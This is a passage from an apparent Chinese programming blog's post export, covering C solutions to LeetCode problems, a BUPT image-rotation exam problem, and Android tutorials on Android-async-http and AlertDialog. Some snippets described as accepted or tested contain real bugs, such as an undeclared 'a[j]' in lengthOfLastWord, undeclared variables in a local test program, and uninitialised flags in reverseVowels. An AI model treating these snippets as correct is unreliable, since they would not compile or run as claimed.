6, 8 are ugly while 14 is not ugly since it includes another prime factor 7. Note that 1 is typically treated as an ugly number. 思路分析把只包含因子2、3和5的数称作丑数（Ugly Number）。例如6、8都是丑数，但14不是，因为它包含因子7。习惯上我们把1当做是第一个丑数。 所谓一个数m是另一个数n的因子，是指n能被m整除，也就是n % m == 0。根据丑数的定义，丑数只能被2、3和5整除。也就是说如果一个数如果它能被2整除，我们把它连续除以2；如果能被3整除，就连续除以3；如果能被5整除，就除以连续5。如果最后我们得到的是1，那么这个数就是丑数，否则不是。 LeetCode AC的代码1234567891011121314bool isUgly(int num) &#123; if(num&lt;=0) return false; while(num%2==0) //连续除以2 num /= 2; while(num%3==0) //连续除以3 num /= 3; while(num%5==0) //连续除以5 num /= 5; if(num == 1) //如果最后得到1，则证明只能被2，3，5整除，即为丑数 return true; else return false;&#125; Problem B. 旋转图像北邮2014年研究生复试机试题 题目描述在图形学中，我们经常需要对具体的图像进行一些处理。在这个问题中，你的任务是将一幅只包含01像素点的图片进行顺时针旋转。旋转的角度仅包含0度，90度，180度，270度。 输入格式 输入的第一行是一个整数T（T&lt;=50），表示输入的数据组数。 每组测试数据的第一行是两个整数N和M，（1&lt;=N,M&lt;=50），表示图片的高度和宽度。 接下来N行，每行是一个长度为M的01串，表示图片的像素点。 最后一行是一个整数angle，表示旋转的角度。 输出格式 对于每组测试数据，输出旋转后得到的图片。请注意不要输出多余的空格或空行。 12345678910111213141516171819输入样例22 3111000903 3111101111180输出样例010101111101111 思路分析此题的关键在于选择合适的存储方式，因为题目中图片有宽高，输入的情况类似于一个矩阵，因此可采用二维数组来存储输入的字符，然后根据旋转角度分情况将字符数组按要求输出即可。 C语言实现12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void rotate0(char** s,int n,int m)&#123; int i; for(i=0;i&lt;n;i++) printf(&quot;%s\n&quot;,s[i]);&#125;void rotate90(char** s,int n,int m)&#123; int i,j; for(i=0;i&lt;m;i++) &#123; for(j=n-1;j&gt;=0;j--) &#123; printf(&quot;%c&quot;,s[j][i]); &#125; printf(&quot;\n&quot;); &#125;&#125;void rotate180(char** s,int n,int m)&#123; int i,j; for(i=n-1;i&gt;=0;i--) &#123; for(j=0;j&lt;m;j++) &#123; printf(&quot;%c&quot;,s[i][j]); &#125; printf(&quot;\n&quot;); &#125;&#125;void rotate270(char** s,int n,int m)&#123; int i,j; for(i=0;i&lt;m;i++) &#123; for(j=0;j&lt;n;j++) &#123; printf(&quot;%c&quot;,s[j][i]); &#125; printf(&quot;\n&quot;); &#125;&#125;int main()&#123; int t,m,n,i,j,angle; char **s; //定义二维字符数组 scanf(&quot;%d&quot;,&amp;t); while(t--)&#123; scanf(&quot;%d %d&quot;,&amp;n,&amp;m); s = (char **)malloc(sizeof(char *)*n); //为二维数组动态分配内存 for(i=0;i&lt;n;i++) &#123; s[i] = (char *)malloc(sizeof(char)*m); scanf(&quot;%s&quot;,s[i]); //输入字符串 &#125; scanf(&quot;%d&quot;,&amp;angle); switch(angle)&#123; case 0: rotate0(s,n,m); break; //旋转0度 case 90: rotate90(s,n,m); break; //旋转90度 case 180: rotate180(s,n,m); break; //旋转180度 case 270: rotate270(s,n,m); break; //旋转270度 &#125; &#125; return 0;&#125;]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>算法学习</tag>
        <tag>LeetCode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法学习-刷题(四)]]></title>
    <url>%2F2016%2F08%2F16%2F%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-%E5%88%B7%E9%A2%98-%E5%9B%9B%2F</url>
    <content type="text"><![CDATA[Add BinaryLeetCode第67题 题目描述Given two binary strings, return their sum (also a binary string). For example, a = “11” b = “1” Return “100”. 思路分析一开始想到的方法是先将字符串转换成十进制数，再按十进制进行加处理，最后再将结果转换成二进制进行输出，然后试了好久一直超时，可能是效率太低了吧，一直都没有得到AC的结果。 最后，还是参考了一下别人的思路：字符串按位相加，先将两个字符串的相同部分从字符串尾部开始进行按位加操作，记录进位，并且加到下一位去，将加的结果存到另一个字符串中，再将长那一部分字符与上一步得到的进位进行按位加，同样将加的结果存在第三个字符串，如果最后还有进位，再把最后的进位加到字符串的尾部，但是最后得到的字符串并不是题目要求的结果，而是题目要求的结果的逆序字符串，所以还得进行字符串反转。 LeetCode AC的代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667char* addBinary(char* a, char* b) &#123; int len1,len2,len3,i,j,num,flag=0; char *c,temp; len1 = strlen(a) - 1; len2 = strlen(b) - 1; c = (char *)malloc(sizeof(char)*100); //为结果字符串分配内存空间 i=0; while(len1&gt;=0&amp;&amp;len2&gt;=0) //从最低位开始将a字符串与b字符串等长的那一部分按位加 &#123; num = (a[len1]-&apos;0&apos;)+(b[len2]-&apos;0&apos;)+flag; flag = num/2; //判断是否有进位 num = num%2; //得到该位相加的结果 c[i] = (char)(num+&apos;0&apos;); //添加到结果字符串 len1--; //移动到下一次字符 len2--; //移动到下一次字符 i++; &#125; while(len1&gt;=0) //如果a字符串比b长，则将a比b长的那一部分将入到结果字符串 &#123; num = (a[len1]-&apos;0&apos;)+flag; flag = num/2; num = num%2; c[i] = (char)(num+&apos;0&apos;); len1--; len2--; i++; &#125; while(len2&gt;=0) //如果b字符串比a长，则将b比a长的那一部分将入到结果字符串 &#123; num = (b[len2]-&apos;0&apos;)+flag; flag = num/2; num = num%2; c[i] = (char)(num+&apos;0&apos;); len1--; len2--; i++; &#125; if(flag&gt;0) //处理最后的进位 &#123; c[i] = (char)(flag+&apos;0&apos;); i++; &#125; c[i] = &apos;\0&apos;; //添加字符串结束符 len3 = strlen(c); for(j=0;j&lt;len3/2;j++) //将结果字符串反转 &#123; temp = c[j]; c[j] = c[len3-1-j]; c[len3-1-j] = temp; &#125; return c; //返回结果字符串&#125; Length of Last WordLeetCode第58题 题目描述Given a string s consists of upper/lower-case alphabets and empty space characters ‘ ‘, return the length of last word in the string. If the last word does not exist, return 0. Note: A word is defined as a character sequence consists of non-space characters only. For example,Given s = “Hello World”,return 5. 思路分析从头开始记录每个单词的长度，再判断空格的位置，空格之后还有单词则清空对前一个单词长度的记录，记录这个单词的长度，直到找到最后一个单词。 LeetCode AC的代码123456789101112131415161718192021222324int lengthOfLastWord(char* s) &#123; int i,j,count=0; for(i=0;s[i]!=&apos;\0&apos;;i++) &#123; if(isalpha(s[i])) //判断是不是字母 &#123; count++; //记录word长度 continue; &#125; if(isspace(s[i])) //如果是空格，则判断之后是否还有空格，如果有则不是最后的字符串，否则是最后的字符串 &#123; for(j=i;a[j]!=&apos;\0&apos;;j++) &#123; if(isspace(s[j])) //如果是连续的空格则继续下一个字符 continue; else //如果空格后还有字符，则进入下一次循环 break; &#125; if(s[j]!=&apos;\0&apos;) //如果不是最后的word，则将计数清空 count=0; &#125; &#125; return count; //返回word的长度&#125; Power of ThreeLeetCode第326题 题目描述Given an integer, write a function to determine if it is a power of three. Follow up:Could you do it without using any loop / recursion? 思路分析判断是否是3的次方，让这个数一直除以3，如果余数全为0，则可判定为3的指数。 LeetCode AC的代码12345678910111213bool isPowerOfThree(int n) &#123; if(n&lt;=0) return false; if(n == 1) return true; while(n&gt;1) &#123; if(n%3) return false; //判断余数是不是0，是则继续下一步，否则判定为不是3的次方 n = n/3; //得到商 &#125; return true;&#125; Power of FourLeetCode第342题 题目描述Given an integer (signed 32 bits), write a function to check whether it is a power of 4. Example: Given num = 16, return true. Given num = 5, return false. Follow up: Could you solve it without loops/recursion? 思路分析此题与上一题思路一致。 LeetCode AC的代码12345678910111213bool isPowerOfFour(int num) &#123; if(num&lt;=0) return false; if(num == 1) return true; while(num&gt;1) &#123; if(num%4) return false; num = num/4; &#125; return true;&#125;]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>算法学习</tag>
        <tag>LeetCode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法学习-刷题(三)]]></title>
    <url>%2F2016%2F08%2F14%2F%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-%E5%88%B7%E9%A2%98-%E4%B8%89%2F</url>
    <content type="text"><![CDATA[Power of TwoLeetCode第231题 题目描述Given an integer, write a function to determine if it is a power of two. 思路分析i&amp;(i - 1)是用来判断一个数是否是2的指数的快捷方法，比如8，二进制位1000, 那么8&amp;(8-1)为0，只要&amp;的结果为0就是2的指数。 leetcode AC的代码12345678910111213bool isPowerOfTwo(int n) &#123; if(n&lt;=0) &#123; return false; &#125; else &#123; if(n&amp;(n-1)) return false; else return true; &#125;&#125; 提交上面的代码之后发现这个效率还是不太高啊，于是又到讨论区去学习了一下别人的思路，以下是一个相对高效的代码： 1234567891011121314bool isPowerOfTwo(int n) &#123; //int型最大32位，但是最大值取不到，所以最大的2的次方只能到0x40000000 int ref = 0x40000000; if(n&lt;=0) &#123; return false; &#125; else &#123; while( ref &gt; n) ref &gt;&gt;= 1; //如果n比ref小，则ref移位直到ref小于n //ref始终是2的次方 return ( n == ref ) ? true : false; //比较n与ref是否相等 &#125;&#125; Reverse StringLeetCode第344题 题目描述Write a function that takes a string as input and returns the string reversed. Example: Given s = “hello”, return “olleh”. 思路分析字符串反转，其实也是比较简单的一道题，最近在做考研数据结构的复习题，在线性表的课后习题中看到了类似的考题。基本思路就是字符互换。 leetcode AC的代码123456789101112char* reverseString(char* s) &#123; int len,i; char temp; len = strlen(s); //获取字符串长度 for(i=0;i&lt;len/2;i++) //进行前半段字符与后半段字符的依次互换 &#123; temp = s[i]; s[i] = s[len-1-i]; s[len-1-i] = temp; &#125; return s;&#125; 这也是AC的代码，从字符串两端开始互换，运行起来比上一个要快一点点 12345678910111213141516char* reverseString(char* s) &#123; int len,start,end; char temp; len = strlen(s); //获取字符串长度 start = 0; //字符串开始位置 end = len -1; //字符串结束位置 while(start&lt;end) //字符互换并移到下一个字符 &#123; temp = s[start]; s[start] = s[end]; s[end] = temp; start++; end--; &#125; return s;&#125; 本地测试时的代码1234567891011121314151617181920#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main()&#123; char *str; str = (char *)malloc(sizeof(char)*100); scanf(&quot;%s&quot;,str); len = strlen(str); for(i=0;i&lt;len/2;i++) &#123; temp = p[i]; p[i] = p[len-1-i]; p[len-1-i] = temp; &#125; printf(&quot;%s&quot;,p); return 0;&#125; Reverse Vowels of a StringLeetCode第345题 题目描述Write a function that takes a string as input and reverse only the vowels of a string. Example 1: Given s = “hello”, return “holle”. Example 2: Given s = “leetcode”, return “leotcede”. Note:The vowels does not include the letter “y”. 思路分析将字符串中的元音字母进行互换。从字符串的头尾两端进行扫描，发现元音字母就将标志位置为并停止移动，当两边都找到一个元音字母时就进行互换，再清空标志位，继续移位寻找。 leetcode AC的代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950char isVowels(char c)&#123; switch(c) &#123; case &apos;a&apos;: case &apos;o&apos;: case &apos;e&apos;: case &apos;i&apos;: case &apos;u&apos;: case &apos;A&apos;: case &apos;O&apos;: case &apos;E&apos;: case &apos;I&apos;: case &apos;U&apos;: return 1; default: return 0; &#125; return 0;&#125;char* reverseVowels(char* s) &#123; int len,start,end,start_flag,end_flag; char temp; len = strlen(s); start = 0; end = len - 1; while(start &lt; end) &#123; if(isVowels(s[start])) start_flag = 1; //找到元音字母，则将标志位置为1，并停止移动 else start++; if(isVowels(s[end])) end_flag = 1; //找到元音字母，则将标志位置为1，并停止移动 else end--; if((start_flag == 1)&amp;&amp;(end_flag == 1)) //左右标志位均被置位时进行互换 &#123; temp = s[start]; s[start] = s[end]; s[end] = temp; start_flag = 0; //标志位清零 end_flag = 0; start++; //继续移动 end--; &#125; &#125; return s;&#125; 本地测试的代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;char isVowels(char c)&#123; switch(c) &#123; case &apos;a&apos;: case &apos;o&apos;: case &apos;e&apos;: case &apos;i&apos;: case &apos;u&apos;: case &apos;A&apos;: case &apos;O&apos;: case &apos;E&apos;: case &apos;I&apos;: case &apos;U&apos;: return 1; default: return 0; &#125; return 0;&#125;int main()&#123; int len,start,end,start_flag,end_flag; char *str,temp; str = (char *)malloc(sizeof(char)*100); scanf(&quot;%s&quot;,str); len = strlen(str); printf(&quot;%d&quot;,len); start = 0; end = len - 1; while(start &lt; end) &#123; if(isVowels(str[start])) start_flag = 1; else start++; if(isVowels(str[end])) end_flag = 1; else end--; if((start_flag == 1)&amp;&amp;(end_flag == 1)) &#123; temp = str[start]; str[start] = str[end]; str[end] = temp; start_flag = 0; end_flag = 0; start++; end--; &#125; &#125; printf(&quot;%s&quot;,str); return 0;&#125;]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>算法学习</tag>
        <tag>LeetCode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android网络请求框架Android-async-http]]></title>
    <url>%2F2016%2F08%2F14%2FAndroid%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82%E6%A1%86%E6%9E%B6Android-async-http%2F</url>
    <content type="text"><![CDATA[Http网络数据交互是Android中极其重要并且使用很频繁的模块。前段时间写了一篇博客总结了Android Http网络请求，但是其中还有很多没有考虑到的问题。众所周知，网络请求方式的效率和性能直接影响到APP的整体用户体验流畅性，在我们自己编写网络请求方法中往往不会考虑这么周全。但是，还好有技术大牛为我们提供了开源的第三方网络请求框架：Android-async-http。 Android-async-http简介Async-http是一款国外的开源框架，是基于Apache HttpClient库的，使用它可以方便快速高效的进行网络数据请求和发送，文件下载和上传。 特点： 清晰的网络请求回调； 内部采用线程池来处理并发请求，限制并发资源使用情况； http请求发生在UI（主）线程之外的异步线程中； 内置多部分文件上传，不需要第三方库支持； 流式Json上传，不需要额外的库； 在各种各样的移动连接环境中具备自动智能请求重试机制； 等等 简单应用下载jar包（1）Github地址：https://github.com/loopj/android-async-http （2）CSDN下载地址：http://download.csdn.net/detail/bambooofmottled/7866567 （3）也可以自己百度去找，这是一个很受欢迎的开源框架，资源很丰富。 添加到工程将jar包复制到工程的libs目录下，右键移到Build Path然后点击Add to Build Path。 封装自己的Http请求类封装了HTTP请求中最常见的GET和POST方法的请求，通过Handler在异步网络请求与UI主线程之间来传递消息。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354public class HttpUtil &#123; private static AsyncHttpClient client; public static void doGet(String url, final Handler handler) &#123; client = new AsyncHttpClient(); //可以为Http请求添加头部信息，比如很多开放的API都需要添加申请到的api-key client.addHeader(&quot;键&quot;, &quot;值&quot;); client.get(url, new AsyncHttpResponseHandler() &#123; @Override public void onSuccess(int statusCode, Header[] headers,byte[] responseBody) &#123; // TODO Auto-generated method stub String response = new String(responseBody); System.out.println(response); //打印接收到的数据，以便调试 Message msg = new Message(); //将数据封装到Message中 msg.obj = response; handler.sendMessage(msg); //使用Handler将Message传给UI线程，以便刷新界面 &#125; @Override public void onFailure(int statusCode, Header[] headers,byte[] responseBody, Throwable error) &#123; // TODO Auto-generated method stub String response = new String(responseBody); System.out.println(response); //打印错误信息，以便调试 &#125; &#125;); &#125; public static void doPost(String url, RequestParams params,final Handler handler) &#123; client = new AsyncHttpClient(); //可以为Http请求添加头部信息，比如很多开放的API都需要添加申请到的api-key client.addHeader(&quot;键&quot;, &quot;值&quot;); client.post(url, params, new AsyncHttpResponseHandler() &#123; @Override public void onSuccess(int statusCode, Header[] headers,byte[] responseBody) &#123; // TODO Auto-generated method stub String response = new String(responseBody); System.out.println(response); //打印接收到的数据，以便调试 Message msg = new Message(); msg.obj = response; //将数据封装到Message中 handler.sendMessage(msg); //使用Handler将Message传给UI线程，以便刷新界面 &#125; @Override public void onFailure(int statusCode, Header[] headers,byte[] responseBody, Throwable error) &#123; // TODO Auto-generated method stub String response = new String(responseBody); System.out.println(response); //打印错误信息，以便调试 &#125; &#125;); &#125;&#125; 使用示例调用自己封装好的GET请求和POST请求方法都需要传递Handler来传递消息，以便在网络请求我完成时，将服务器返回的数据传递给UI线程，然后进行UI更新。 12345678910111213141516171819202122232425262728293031323334353637public class MainActivity extends Activity &#123; private Handler mGetHandler = new Handler() &#123; public void handleMessage(android.os.Message msg) &#123; String res = (String) msg.obj; Toast.makeText(MainActivity.this, &quot;请求成功&quot;, Toast.LENGTH_SHORT).show(); System.out.println(res); //打印传递过来的数据 //此处，拿到数据之后就可以解析数据，比如JSON数据解析，然后进行UI的更新 &#125;; &#125;; private Handler mPostHandler = new Handler() &#123; public void handleMessage(android.os.Message msg) &#123; String res = (String) msg.obj; Toast.makeText(MainActivity.this, &quot;请求成功&quot;, Toast.LENGTH_SHORT).show(); System.out.println(res); //打印传递过来的数据 //此处，拿到数据之后就可以解析数据，比如JSON数据解析，然后进行UI的更新 &#125;; &#125;; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); String getUrl = &quot;你的get请求的url&quot;; HttpUtil.doGet(getUrl, mGetHandler); String postUrl = &quot;你的post请求的url&quot;; RequestParams params = new RequestParams(); params.add(&quot;键&quot;, &quot;值&quot;); //可通过add方法添加多个请求参数 HttpUtil.doPost(postUrl, params, mPostHandler); &#125;&#125; 此博客主要展示了如何使用Android-async-http的GET和POST请求，这也是我自己在开发中最常用的两个请求方法，虽然这只是这个强大的网络请求库的一部分功能，但是这已经让我的开发变得更方便高效，也使得开发的应用程序的网络请求能够稳定高效，除此之外，Android-async-http还有很多优秀的功能，有机会再好好挖掘，先分享到这里。]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>［Android,网络］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android AlertDialog详解]]></title>
    <url>%2F2016%2F08%2F13%2FAndroid-AlertDialog%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[AlertDialog就是Android中的弹出式对话框，很多应用中都有对AlertDialog的应用。前段时间，一位学长问我自定义AlertDialog的问题，因为自己也只是之前用过，并不是很熟悉，所以我也只能很抱歉地回绝了，这一次通过写这篇博客对AlertDialog的操作进行了详细的总结，介绍了AlertDialog类和AlertDialog.Builder类，以及给AlertDialog设置不同的内容，最后还实现了自定义的AlertDialog。 AlertDialog继承自Dialog类，对于Android内置的AlertDialog，它可以包含一个标题、一个内容消息或者一个选择列表、最多三个按钮。而创建AlertDialog推荐使用它的一个内部类AlertDialog.Builder创 建，使用Builder对象，可以设置AlertDialog的各种属性，最后通过Builder.create()就可以得到AlertDialog对 象，再使用Builder.show()方法来显示。 官方图解： （1）区域1是AlertDialog对话框的头部信息区域，包括标题名或者是一个图标。 （2）区域2是AlertDialog对话框的内容部分，在这里我们可以设置Message信息或者是选择框，还可以设置自定义的布局弹出框。 （3）区域3是AlertDialog对话框的操作按钮部分，可以设置相应的按钮。 AlertDialog类常用方法 方法 描述 setTitle(CharSequence title) 为对话框设置标题 setIcon(Drawable icon) 通过Drawable资源对象为对话框设置图标 setIcon(int resId) 通过资源ID为对话框设置图标 setButton(int whichButton, CharSequence text, DialogInterface.OnClickListener listener) 为对话框添加按钮 setMessage(CharSequence message) 为对话框设置提示内容 使用示例12345678910111213141516171819202122AlertDialog dialog = new AlertDialog.Builder(this).create();dialog.setTitle(&quot;退出&quot;);dialog.setMessage(&quot;是否要退出&quot;);dialog.setButton(DialogInterface.BUTTON_NEGATIVE, &quot;取消&quot;,new OnClickListener() &#123; @Override public void onClick(DialogInterface arg0, int arg1) &#123; // TODO Auto-generated method stub Toast.makeText(MainActivity.this, &quot;取消&quot;,Toast.LENGTH_SHORT).show(); &#125;&#125;);dialog.setButton(DialogInterface.BUTTON_POSITIVE, &quot;确定&quot;,new OnClickListener() &#123; @Override public void onClick(DialogInterface arg0, int arg1) &#123; // TODO Auto-generated method stub Toast.makeText(MainActivity.this, &quot;确定&quot;,Toast.LENGTH_SHORT).show(); &#125;&#125;);dialog.show(); AlertDialog.Builder类AlertDialog类提供了弹出框的一些基本的方法，但是要想设置更多的元素来丰富我们的弹出框就要使用到AlertDialog.Builder类了。 常用方法 方法 描述 setTitle(CharSequence title) 为对话框设置标题 setIcon(Drawable icon) 通过Drawable资源对象为对话框设置图标 setIcon(int resId) 通过资源ID为对话框设置图标 setMessage(CharSequence message) 为对话框设置提示内容 setNegativeButton(CharSequence text, DialogInterface.OnClickListener listener) 为对话框添加取消按钮 setPositiveButton(CharSequence text, DialogInterface.OnClickListener listener) 为对话框添加确定按钮 setNeutralButton(CharSequence text, DialogInterface.OnClickListener listener) 为对话框添加中立按钮 setItems(CharSequence[] items, DialogInterface.OnClickListener listener) 为对话框设置列表项 setSingleChoiceItems(CharSequence[] items, int checkedItem, DialogInterface.OnClickListener listener) 为对话框设置单选列表项 setMultiChoiceItems(CharSequence[] items, boolean[] checkedItems, DialogInterface.OnMultiChoiceClickListener listener) 为对话框设置多选列表项 注意：setMessage()、setItems()、setSingleChoiceItems()、setMultiChoiceItems()方法不能同时使用。因为他们都是对弹出框的内容区域的设置。 设置按钮12345678910111213141516171819202122232425262728293031Builder builder = new AlertDialog.Builder(this);builder.setTitle(&quot;更新&quot;);builder.setMessage(&quot;是否要进行更新？&quot;);builder.setNegativeButton(&quot;取消&quot;, new OnClickListener() &#123; @Override public void onClick(DialogInterface dialog, int whitch) &#123; // TODO Auto-generated method stub Toast.makeText(MainActivity.this, &quot;取消&quot;, Toast.LENGTH_SHORT).show(); &#125;&#125;);builder.setPositiveButton(&quot;确定&quot;, new OnClickListener() &#123; @Override public void onClick(DialogInterface dialog, int whitch) &#123; // TODO Auto-generated method stub Toast.makeText(MainActivity.this, &quot;确定&quot;, Toast.LENGTH_SHORT).show(); &#125;&#125;);builder.setNeutralButton(&quot;忽略&quot;, new OnClickListener() &#123; @Override public void onClick(DialogInterface dialog, int whitch) &#123; // TODO Auto-generated method stub Toast.makeText(MainActivity.this, &quot;忽略&quot;, Toast.LENGTH_SHORT).show(); &#125;&#125;);builder.show(); 设置列表项1234567891011121314final CharSequence items[] = new String[] &#123;&quot;北京&quot;,&quot;上海&quot;,&quot;广州&quot;,&quot;深圳&quot;,&quot;成都&quot;,&quot;南京&quot;&#125;;Builder builder = new AlertDialog.Builder(MainActivity.this);builder.setTitle(&quot;请选择&quot;);builder.setItems(items, new OnClickListener() &#123; @Override public void onClick(DialogInterface dialog, int whitch) &#123; // TODO Auto-generated method stub String selectedItem = items[whitch].toString(); Toast.makeText(MainActivity.this, selectedItem, Toast.LENGTH_SHORT).show(); &#125;&#125;);builder.show(); 设置单选列表项1234567891011121314151617181920212223242526272829303132final CharSequence items[] = new String[] &#123;&quot;北京&quot;,&quot;上海&quot;,&quot;广州&quot;,&quot;深圳&quot;,&quot;成都&quot;,&quot;南京&quot;&#125;;Builder builder = new AlertDialog.Builder(MainActivity.this);builder.setTitle(&quot;请选择&quot;);builder.setSingleChoiceItems(items, 1, new OnClickListener() &#123; @Override public void onClick(DialogInterface dialog, int whitch) &#123; // TODO Auto-generated method stub String selectedItem = items[whitch].toString(); Toast.makeText(MainActivity.this, selectedItem, Toast.LENGTH_SHORT).show(); &#125;&#125;);builder.setNegativeButton(&quot;取消&quot;, new OnClickListener() &#123; @Override public void onClick(DialogInterface dialog, int whitch) &#123; // TODO Auto-generated method stub Toast.makeText(MainActivity.this, &quot;取消&quot;, Toast.LENGTH_SHORT).show(); &#125;&#125;);builder.setPositiveButton(&quot;确定&quot;, new OnClickListener() &#123; @Override public void onClick(DialogInterface dialog, int whitch) &#123; // TODO Auto-generated method stub dialog.dismiss(); &#125;&#125;);builder.show(); 设置多选列表项123456789101112131415161718192021222324252627282930313233CharSequence items[] = new String[] &#123;&quot;北京&quot;,&quot;上海&quot;,&quot;广州&quot;,&quot;深圳&quot;,&quot;成都&quot;,&quot;南京&quot;&#125;;boolean[] checkedItems = new boolean[] &#123;true,false,true,true,false,true&#125;; Builder builder = new AlertDialog.Builder(MainActivity.this);builder.setTitle(&quot;请选择&quot;);builder.setMultiChoiceItems(items, checkedItems, new OnMultiChoiceClickListener() &#123; @Override public void onClick(DialogInterface dialog, int whitch, boolean isChecked) &#123; // TODO Auto-generated method stub &#125;&#125;);builder.setNegativeButton(&quot;取消&quot;, new OnClickListener() &#123; @Override public void onClick(DialogInterface dialog, int whitch) &#123; // TODO Auto-generated method stub Toast.makeText(MainActivity.this, &quot;取消&quot;, Toast.LENGTH_SHORT).show(); &#125;&#125;);builder.setPositiveButton(&quot;确定&quot;, new OnClickListener() &#123; @Override public void onClick(DialogInterface dialog, int whitch) &#123; // TODO Auto-generated method stub dialog.dismiss(); &#125;&#125;);builder.show(); 自定义AlertDialog123456789101112131415161718192021222324252627282930Builder builder = new AlertDialog.Builder(MainActivity.this);builder.setTitle(&quot;请输入&quot;);// 通过LayoutInflater来加载布局文件作为一个View对象View view = LayoutInflater.from(MainActivity.this).inflate(R.layout.alterdialog, null);// 设置自定义的布局文件作为弹出框的内容builder.setView(view);final EditText username = (EditText) view.findViewById(R.id.et_username);final EditText password = (EditText) view.findViewById(R.id.et_password);builder.setPositiveButton(&quot;确定&quot;, new OnClickListener() &#123; @Override public void onClick(DialogInterface dialog, int whitch) &#123; // TODO Auto-generated method stub String name = username.getText().toString().trim(); String pwd = password.getText().toString().trim(); Toast.makeText(MainActivity.this, name + pwd, Toast.LENGTH_SHORT).show(); &#125;&#125;);builder.setNegativeButton(&quot;取消&quot;, new OnClickListener() &#123; @Override public void onClick(DialogInterface dialog, int whitch) &#123; // TODO Auto-generated method stub dialog.dismiss(); &#125;&#125;);builder.show(); 以上多个方法的参数列表都有用到CharSequence，但是我的例子中直接使用的String，所以在这里做一个补充说明。 CharSequence与String的区别： CharSequence与String都能用于定义字符串，但CharSequence的值是可读可写序列，而String的值是只读序列。]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>［Android,AlertDialog］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[算法学习-刷题(二)]]></title>
    <url>%2F2016%2F08%2F12%2F%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0-%E5%88%B7%E9%A2%98-%E4%BA%8C%2F</url>
    <content type="text"><![CDATA[Counting BitsLeetCode第338题 题目描述Given a non negative integer number num. For every numbers i in the range 0 ≤ i ≤ num calculate the number of 1’s in their binary representation and return them as an array. Example:For num = 5 you should return [0,1,1,2,1,2]. Follow up: It is very easy to come up with a solution with run time O(n*sizeof(integer)). But can you do it in linear time O(n) /possibly in a single pass? Space complexity should be O(n). Can you do it like a boss? Do it without using any builtin function like __builtin_popcount in c++ or in any other language. 思路分析列出前16个数的二进制表示以及1的个数： n(十进制表示) n(二进制表示) count[n]（1的个数） 0 0000 count[1] = 0 1 0001 count[1] = 1 2 0010 count[2] = 1 3 0011 count[3] = 2 4 0100 count[4] = 1 5 0101 count[5] = 2 = count[4] + count[1] 6 0110 count[6] = 2 = count[4] + count[2] 7 0111 count[7] = 3 = count[4] + count[3] 8 1000 count[8] = 1 9 1001 count[9] = 2 = count[8] + count[1] 10 1010 count[10] = 2 = count[8] + count[2] 11 1011 count[11] = 3 = count[8] + count[3] 12 1100 count[12] = 2 = count[8] + count[4] 13 1101 count[13] = 3 = count[8] + count[5] 14 1110 count[14] = 3 = count[8] + count[6] 15 1111 count[15] = 4 = count[8] + count[7] 16 10000 count[16] = 1 观察得： 在n&gt;3之后有如下规律： i&gt;2时，2的i次方中1的个数为1，例如，4，8，16； count[pow(2,i)] = 1； 4-8,8-16这些区间中的数的1的个数都可以拆分成两个数的1的个数的和。 count[pow(2,i) + j] = count[pow(2,i)] + count[j]，其中j在区间[1,pow(2,i)-1] leetcode AC的结果（C语言）123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051/** * Return an array of size *returnSize. * Note: The returned array must be malloced, assume caller calls free(). */int* countBits(int num, int* returnSize) &#123; int i,j; int m; int *p; *returnSize = ++num; p = (int *)malloc(sizeof(int)*(num)); //动态分配内存 if(num == 0) //num等于0时数组的值 &#123; p[0] = 0; &#125;else if(num == 1) //num等于1时数组的值 &#123; p[0] = 0; p[1] = 1; &#125;else if(num == 2) //num等于2时数组的值 &#123; p[0] = 0; p[1] = 1; p[2] = 1; &#125;else if(num == 3) //num等于3时数组的值 &#123; p[0] = 0; p[1] = 1; p[2] = 1; p[3] = 2; &#125;else //得到num大于4的情况下的数组的值（即1的个数） &#123; p[0] = 0; p[1] = 1; p[2] = 1; p[3] = 2; i=2; m = pow(2,i); while(m&lt;num)&#123; p[m] = 1; for(j=1;j&lt;m;j++) &#123; if(m+j&gt;=num) return p; p[m+j] = p[m] + p[j]; &#125; i++; m = pow(2,i); &#125; &#125; return p;&#125; AC之后去看了关于这道题的讨论，其实，自己把问题想的太复杂了，感觉还是智商不够用啊，看看别人的代码，长长见识： 解法一： 从1开始，遇到偶数时，其1的个数和该偶数除以2得到的数字的1的个数相同，遇到奇数时，其1的个数等于该奇数除以2得到的数字的1的个数再加1。 解法一C语言实现注：这是可直接运行的代码，并没有按leetcode的格式提交。123456789101112131415161718192021222324252627282930#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main()&#123; int i,n; int *p; scanf(&quot;%d&quot;,&amp;n); p = (int *)malloc(sizeof(int)*(++n)); //动态分配内存 if(n == 1) p[0] = 0; else &#123; p[0] = 0; for(i=1;i&lt;n;i++) //得到1的个数 &#123; if(i%2 == 0) p[i] = p[i/2]; else p[i] = p[i/2] + 1; &#125; &#125; for(i=0;i&lt;n;i++) printf(&quot;%d &quot;,p[i]); printf(&quot;\n&quot;); return 0;&#125; 解法二： 